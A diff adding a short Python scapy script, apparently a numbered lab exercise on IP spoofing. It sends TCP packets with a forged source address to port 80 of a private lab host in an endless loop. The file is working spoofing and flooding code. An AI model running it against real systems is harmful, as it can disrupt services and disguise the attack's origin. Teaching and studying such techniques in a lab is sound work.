@@ -1,0 +1,17 @@
+2) IP Spoofing
+
+
+from scapy.all import *
+
+# ---------------- IP and Port Setup ----------------
+A = "192.168.5.133"        # Spoofed source IP address
+B = "192.168.5.135"        # Destination IP address
+C = RandShort()            # Random source port
+D = 80                     # Destination port (HTTP)
+payload = "Hello Hello Hello"  # Packet payload
+
+# ---------------- Packet Sending Loop ----------------
+while True:
+    # Create a spoofed IP + TCP packet with payload
+    spoofed_packet = IP(src=A, dst=B) / TCP(sport=C, dport=D) / payload
+    send(spoofed_packet)  # Send the packet
